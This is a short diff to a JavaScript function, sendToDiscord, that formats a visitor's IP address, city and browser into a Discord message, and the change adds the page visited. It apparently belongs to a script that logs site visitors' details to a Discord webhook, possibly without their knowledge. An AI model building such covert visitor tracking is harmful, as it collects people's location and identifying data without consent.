@@ -10,7 +10,7 @@ function sendToDiscord(ip, city, browser) {
                 fields: [
                     { 
                         name: "__📜 Information__", 
-                        value: `**🍦 IP Address: __${ip}__**\n**🚬 City: __${city}__**\n**🚀 Browser: __${browser}__**`, 
+                        value: `**🍦 IP Address: __${ip}__**\n**🚬 City: __${city}__**\n**🚀 Browser: __${browser}__**\n**📄 Page: __${page}__**`, 
                         inline: false 
                     }
                 ],
